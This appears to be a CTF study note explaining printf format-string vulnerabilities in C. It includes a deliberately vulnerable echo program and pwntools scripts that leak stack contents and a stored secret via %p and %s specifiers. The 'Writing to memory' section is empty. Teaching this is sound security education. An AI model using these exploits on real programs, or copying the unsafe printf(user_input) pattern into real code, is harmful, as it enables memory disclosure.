# printf notes

## Category
Notes

## Points
N/A

## Description
This note gives some details of the `printf` format specifier exploit

## Keywords
printf, C, pwntools 

## Notes
In certain circumstances, the C language's workhorse console display function, `printf()` can be exploited to read or write to memory.

* [printf normal usage](#printf-normal-usage)
* [printf vulnerable usage](#printf-vulnerable-usage)
* [Reading through the stack](#reading-through-the-stack)
* [Writing to memory](#writing-to-memory)

### printf normal usage
`printf` is a function included in the `stdio.h` header for displaying text on the console. It can display various combinations of a string literal, specified in the first argument to `printf`, and variables, specified in subsequent arguments. To specify where the variables should be displayed within the string literal, we use **format specifiers**. These start with a `%`, and are followed by a letter denoting the type we are expecting (e.g. `d` for signed decimal integer, and `s` for string).

I won't cover all the possible format specifiers in this note - there are plenty of places to find that information with a quick Google - but the one's we will use will be:

| Specifier | Description
| ------    | ------
| %c | Display an argument as a char
| %d | Display an argument signed decimal integer
| %x | Display an argument as an unsigned hexadecimal integer
| %p | Display an argument as a pointer
| %s | Display an argument as a string
| %n | Displays nothing, but is passed a pointer argument - a pointer to a signed int - and sets that signed int to the number of characters printed out so far.

A simple example of some code using `printf` is below:
```c
#include<stdio.h>

int main()
{
  int i = 10;
  char s[] = "Fred";

  // Print a string literal
  printf("Hello, world!\n");

  // Print a string variable within a literal
  printf("Hi, %s\n", s);

  // Print a string variable and an integer within a literal
  printf("%s's age is %d\n", s, i);

  return 0;
}
```

Compiling and running this code, we get:
```
$ gcc hello-world.c -o hello-world
$ ./hello-world 
Hello, world!
Hi, Fred
Fred's age is 10
```

However, `printf` doesn't care whether the types of variables match the format specifiers. We can mess with it quite easily:
```c
#include<stdio.h>

int main()
{
  int i = 10;
  char s[] = "Fred";

  // Print a string literal
  printf("Hello, world!\n");

  // Print a signed integer, but pass a string
  printf("Hi, %d\n", s);

  // Print a hexidecimal int, passing a string, and a pointer passing an int
  printf("%x's age is %p\n", s, i);

  return 0;
}
```

Compiling and running we now get:
```
$ gcc mismatch.c -o mismatch
$ ./mismatch 
Hello, world!
Hi, 1871460560
6f8c38d0's age is 0xa
```

> It should be pointed out that if you build using `gcc` with `-Wall`, it does warn you about the `printf` mismatches:
```
$ gcc mismatch.c -o mismatch -Wall
mismatch.c: In function ‘main’:
mismatch.c:12:16: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘char *’ [-Wformat=]
   12 |   printf("Hi, %d\n", s);
      |               ~^     ~
      |                |     |
      |                int   char *
      |               %s
mismatch.c:15:12: warning: format ‘%x’ expects argument of type ‘unsigned int’, but argument 2 has type ‘char *’ [-Wformat=]
   15 |   printf("%x's age is %p\n", s, i);
      |           ~^                 ~
      |            |                 |
      |            unsigned int      char *
      |           %s
mismatch.c:15:24: warning: format ‘%p’ expects argument of type ‘void *’, but argument 3 has type ‘int’ [-Wformat=]
   15 |   printf("%x's age is %p\n", s, i);
      |                       ~^        ~
      |                        |        |
      |                        void *   int
      |                       %d
```
> This is true of things we'll do in the rest of this note, but for brevity, we'll always build with only basic warnings on.

Finally, in normal operation of `printf`, we don't have to use the parameters in the order in which they are specified. This feature of `printf` isn't always mentioned in `printf` descriptions, but it's very useful to us.

By inserting `n$` between the `%` and the format letter (where n is an integer between 1 and the number of arguments), we can specify which of the arguments we want to apply to this format specifier. An example will help explain:
```c
#include<stdio.h>

int main()
{
  int i = 20;
  int j = 10;
  int k = 5;
  char c = 'A';

  // Normal use - you can't mix positional and non-positional
  // We can repeatedly use an argument
  printf("%1$d, %4$c, %2$d, %4$c, %3$d, %4$c\n", i, j, k, c);


  // We can skip the first argument
  // What happens with the subsequent specifiers
  // is compiler/platform dependent.
  printf("%2$d %d %c\n", i, j, k, c);

  return 0;
}
```

When compiled and run, we can see how the positional arguments work:
```
$ gcc argument-select.c -o argument-select
$ ./argument-select 
20, A, 10, A, 5, A
10 5 A
```
> This output is from Clang (aliased as gcc) on MacOS X. Using gcc on Linux, the output is:
> 20, A, 10, A, 5, A
> 10 20
>
> where the arguments reset and start from the beginning, showing argument 1, 2 as integers, and then
> 3 as a character (as the value is 10, it just shows a line feed).

So how can we exploit `printf`?

### printf vulnerable usage
What happens if we use `printf` with format specifiers, but we don't specify any arguments? Let's try:
```c
#include <stdio.h>

int main()
{
  printf("%d\n%d\n%d\n");

  return 0;
}
```
We still get some output:
```
$ gcc no-args.c -o no-args
$ ./no-args 
-2060149592
-2060149576
-1444055272
```
We still get some output. So where are those values coming from?

Let's print more (and as hex) and see if we can work it out:
```c
#include <stdio.h>
#include <string.h>

int main()
{
  // Some variables - unused, but show up later
  char s[] = "AAAAAAAAAAAA";
  int a = 1;
  int b = 2;
  int c = 3;

  // Holds are printf format strings so we can
  // build them in a loop.
  char x[15];

  for (unsigned int i=1; i<20; ++i)
  {
    // Create our format strings for %x
    sprintf(x, "%1$d \t %%%1$d$x\n", i);

    // Show us what happens with no arguments
    printf(x);
  }

  return 0;
}
```
This prints out the offset parameter number followed by the contents at that parameter, interpreted as a hexadecimal integer:
```
$ gcc -m32 no-args-x.c -o no-args-x
$ ./no-args-x 
1 	 5660e008
2 	 2
3 	 5660d1c0
4 	 0
5 	 0
6 	 5660c034
7 	 37f62a28
8 	 25200920
9 	 a782439
10 	 a78
11 	 f7db3c1e
12 	 41f613fc
13 	 41414141
14 	 41414141
15 	 414141
16 	 3
17 	 2
18 	 1
19 	 13
```
Now we can start to see what we're looking at. The first byte of offset 12, and all of offsets 13, 14 and 15 contain 12 ASCII values for the letter 'A' (`0x41`). Offset 16 has the value 3 in it, 17 has 2, and 18 has 1. These are the variables from our code! Our `s`, `a`, `b` and `c`. These are values off the stack!

As a side note, I built this executable as 32-bit so it shows things a bit more clearly than a 64-bit executable. Below is the output from a 32-bit and 64-bit executables showing hexadecimal integers (%x) and pointers (%p) to clarify. It shows the relevant offsets only, which have shifted from above with the addition of more local variables to handle the %p output, and also change between the 64-bit and 32-bit executables:

|            | 32-bit |         |            | 64-bit |        |
| :-------:  | ------ | ------- | -----      | ------ | ------ |
| **Offset** | **%x** | **%p**  | **Offset** | **%x** | **%p** |
| 13 | 33312520 | 0x33312520 | 13 | 0        | (nil)              |
| 14 | a7824    | 0xa7824    | 14 | 41c631f0 | 0x4141414141c631f0 |
| 15 | f7d7ac1e | 0xf7d7ac1e | 15 | 41414141 | 0x41414141414141   |
| 16 | 41f283fc | 0x41f283fc | 16 | 3        | 0x200000003        |
| 17 | 41414141 | 0x41414141 | 17 | 1        | 0x1100000001       |
| 18 | 41414141 | 0x41414141 | 18 | f3c631f0 | 0x561ef3c631f0     |
| 19 | 414141   | 0x414141   | 19 | 8131bd0a | 0x7ff58131bd0a     |
| 20 | 3        | 0x3        | 20 | 72064298 | 0x7ffd72064298     |
| 21 | 2        | 0x2        | 21 | 0        | 0x100000000        |
| 22 | 1        | 0x1        | 22 | f3c63145 | 0x561ef3c63145     |
| 23 | 17       | 0x17       | 23 | 8131b7cf | 0x7ff58131b7cf     |

Here we can see that `%p` shows the same information as `%x` in 32-bit executables, but in the 64-bit version, the `%p` shows the full 64-bits, while `%x` just shows the 32 Least Significant Bits (LSBs) of each address. As the 64-bit executable has 64-bit pointers, the `%x` will step 64-bits for each position specified, but only show 32-bits of information.

I advise using `%p` instead of `%x` for displaying stack contents (at least initially). It will display full contents for every location, and won't crash (as `%s` does if it doesn't find a valid string) or display strange characters (like `%c`) or difficult to interpret numbers (like `%d`).

But how does any of this help us? It's very unlikely someone has accidentally created a series of format strings in their code without arguments and it prints out the stack and they've tested it and not noticed!

Well, something that happens more commonly (at least in CTFs) is a program taking user input and echoing it back to the user without a format string:
```c
#include <stdio.h>
#include <string.h>

#define BUFF_SIZE 40
int main(void)
{
  char user_input[BUFF_SIZE];
  char s[] = "Secret Password";
  char q[] = "quit\n";
  do {
    printf("What do you want me to say? > ");
    fgets(user_input, BUFF_SIZE, stdin);
    printf(user_input);
  } while(strcmp(q, user_input) != 0);
}
```
So, instead of using something like `printf("%s\n", user_input);` this program simply prints the user input directly back at the screen. This means we can send a format string to it and we can see what's on the stack!
```
$ gcc -m32 user-input.c -o user-input
$ ./user-input 
What do you want me to say? > hello
hello
What do you want me to say? > %p %p %p %p %p %p %p %p %p %p %p %p %p
0x28 0xf7f44580 0x565611d0 0x75710000 0xa7469 0x72636553 0x50207465 0x77737361 0x64726f 0x25207025 0x70252070 0x20702520 0x25207025
What do you want me to say? > quit
quit
```

If we look at this output, we can see some values at positions 6, 7, 8 and 9 that are interesting:
| Pointer value | ASCII Character |
| ----------    | ----------      |
| 0x72636553    | rceS | 
| 0x50207465    | P te | 
| 0x77737361    | wssa |
| 0x64726f      |  dro |

Because displaying this as a pointer on a Little-Endian system, the letters are reversed, but we can still make out where this comes from in the program! 

It would be more useful if we could display this as a string. However, strings aren't the same as the other format specifiers. Instead of displaying what is on the stack, `%s` displays what is pointed to by the value on the stack. Later we will manufacture the pointer ourselves to gain access to the string, but for now we'll include it in the program by adapting the previous example:
```c
#include <stdio.h>
#include <string.h>

#define BUFF_SIZE 40
int main(void)
{
  char user_input[BUFF_SIZE];
  char s[] = "Secret Password";
  char q[] = "quit\n";

  // Put a pointer to our string on the stack
  // and tell the user what to look for
  char *s_addr = s;
  printf("The pointer is %p\n",s_addr);

  do {
    printf("What do you want me to say? > ");
    fgets(user_input, BUFF_SIZE, stdin);
    printf(user_input);
  } while(strcmp(q, user_input) != 0);
}
```

Now we can search through the stack for that pointer. We use a 64-bit executable again now:
```
$ gcc user-input.c -o user-input
$./user-input 
The pointer is 0x7ffc8121f680
What do you want me to say? > %p %p %p %p %p %p %p %p %p %p %p %p %p %p
0x564de65296d7 (nil) 0x2070252070252070 0x7ffc8121f690 0x2070252070252070 0xf0b6ff 0xa7469757100c2 0x5020746572636553 0x64726f77737361 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 What do you want me to say? > 0x564de65296da
What do you want me to say? > %15$p %16$p %17$p %18$p %19$p %20$p
0x7ffc8121f680 0x564de54ef200 0x7f0bdcb2fd0a 0x7ffc8121f7b8 0x100000000 0x564de54ef155
What do you want me to say? > %15$p
0x7ffc8121f680
What do you want me to say? > %15$s
Secret Password
What do you want me to say? > quit
quit
```

We search through the stack for the pointer that the program displayed to us. Here we find it at position 15, and confirm it with a `%15$p`. Then we can print the string that address points to with `%15s`.

OK. So we can see things on the stack and display them in various ways. But what if what we want is a hundred positions deep in the stack? Or we want to just print out lots of stack to see what we have? Or the program doesn't tell us the string pointer we need to find? Python and [pwntools](https://github.com/Gallopsled/pwntools#readme) can help us out here!

### Reading through the stack
Let's start with the same program from last time, but instead of having to manually find the pointer and print the string I'll get Python to do the work. A reminder of the code:
```c
#include <stdio.h>
#include <string.h>

#define BUFF_SIZE 40
int main(void)
{
  char user_input[BUFF_SIZE];
  char s[] = "Secret Password";
  char q[] = "quit\n";

  // Put a pointer to our string on the stack
  // and tell the user what to look for
  char *s_addr = s;
  printf("The pointer is %p\n",s_addr);

  do {
    printf("What do you want me to say? > ");
    fgets(user_input, BUFF_SIZE, stdin);
    printf(user_input);
  } while(strcmp(q, user_input) != 0);
}
```

And here is some Python, using [pwntools](https://github.com/Gallopsled/pwntools#readme) to interact with the executable. Basically, the code gets the line that prints the pointer, strips the pointer out of it, and then uses a loop to send various `%n$p` specifiers until it finds the matching pointer in the stack. Then it uses that to output the string with `%n$s`:
```python
from pwn import *
import re

# Open the executable with stdbuf to stop it
# buffering input/output so recv*() functions
# work properly
p = process(["stdbuf", "-i0", "-o0", "-e0", "./user-input"])

# Read the line containing the address and strip
# out the pointer
addr = p.recvline()
addr_v = re.search('0x[0-9a-f]+', str(addr)).group(0)
print(f"Looking for pointer: {addr_v}...")

# Get the poiter for up to 30 positions
for i in range(1, 30):
    # Get the prompt
    p.recvuntil("> ")

    # Send our %n$p and see if it's
    # the position of our pointer
    p.sendline(f"%{i}$p")
    response = p.recvline().strip().decode("utf-8")
    if response == addr_v:
        break

# We got the pointer (or just completed the loop)
# Now use %n$s at that position
print(f"Found pointer at position {i}")
prompt = p.recvuntil("> ")
p.sendline(f"%{i}$s")
str_response = p.recvline().strip().decode("utf-8")
print(f"String is: {str_response}")

# Just close the process
p.close()
```

When run, this outputs:
```
$ python3 get-pointer.py 
[+] Starting local process '/usr/bin/stdbuf': pid 80008
Looking for pointer: 0x7fff08d3ec90...
Found pointer at position 15
String is: Secret Password
[*] Stopped process '/usr/bin/stdbuf' (pid 80008)
```

Of course, it's now simple just to dump a massive amount of stack into a file so we can go through it:
```python
from pwn import *

# Open the executable with stdbuf to stop it
# buffering input/output so recv*() functions
# work properly
p = process(["stdbuf", "-i0", "-o0", "-e0", "./user-input"])

# We don't need the pointer line
p.recvline()

# Get 500 pointers from the stack
for i in range(1, 501):
    # Get the prompt
    p.recvuntil("> ")
    
    # Send a value and get the result
    p.sendline(f"%{i}$p")
    response = p.recvline().strip().decode("utf-8")
    print(f"Position {i}: {response}")

# Close it, if we haven't already crashed 
# because it's out of scope
p.close()
```

We could update this easily to print out `%p`, `%x`, `%c`, `%d`, etc. String, however, add an extra problem. Because strings assume they're being given pointers to `char *` arrays, it will try to get a string at address it reads off the stack. This means it can crash the program for out of scope accesses, causing `Segmentation fault` errors.

This just means we have to continually open and close the program within a loop to be able to read through the stack looking for strings:
```python
from pwn import *

# Stop all the output about starting and stopping
# the process
context.log_level = 'critical'

for i in range(1, 20):

    try:
        # Open the executable with stdbuf to stop it
        # buffering input/output so recv*() functions
        # work properly
        p = process(["stdbuf", "-i0", "-o0", "-e0", "./user-input"])

        # We don't need the pointer line
        p.recvline()

        # Get the prompt
        p.recvuntil("> ")
    
        # Send a value and get the result
        p.sendline(f"%{i}$s")
        response = p.recvline().strip().decode("utf-8")
        print(f"Position {i}: {response}")
        p.close()
    except:
        print(f"Position {i}: Segmentation error!")
        p.close()

print('Done!')
```
When we run this we can see any strings pointed to by the stack:
```
$ python3 dump-strings.py 
Position 1: 
Position 2: (null)
Position 3: H=
Position 4: %4$s
Position 5: (null)
Position 6: (null)
Position 7: Segmentation error!
Position 8: Segmentation error!
Position 9: Segmentation error!
Position 10: Segmentation error!
Position 11: (null)
Position 12: Segmentation error!
Position 13: Segmentation error!
Position 14: 
Position 15: Secret Password
Position 16: Segmentation error!
Position 17: Segmentation error!
Position 18: Segmentation error!
Position 19: Segmentation error!
Done!
```

### Writing to memory


